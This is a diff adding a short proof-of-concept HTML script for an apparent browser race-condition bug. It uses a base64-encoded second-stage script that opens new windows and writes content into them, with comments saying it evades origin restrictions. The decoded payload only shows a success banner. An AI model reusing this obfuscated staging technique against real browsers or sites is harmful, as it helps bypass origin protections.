@@ -1,0 +1,14 @@
+<script>
+  // we need as little code exec time for the script, this is basicly a race condition
+
+  var payload_stage2=atob("PHNjcmlwdD4KICAgIHZhciBwYXlsb2FkID0gIlBHZ3hQbWwwSUdaMVkydHBibWNnZDI5eWEyVmtJU0VoUEM5b01UND0iOwogICAgd2luZG93Lm9wZW4oKS5kb2N1bWVudC53cml0ZShhdG9iKHBheWxvYWQpKTsKPC9zY3JpcHQ+"); // launches normal payload (evades orgin stuff)
+
+  window.open().document.write(payload_stage2);
+  
+  function method2() {
+      window.open().document.write(payload_stage2);
+  }
+
+  // the orignal bug was weird. it will attempt method 2 too (the orignal method)
+  setTimeout(method2,2000);
+</script>
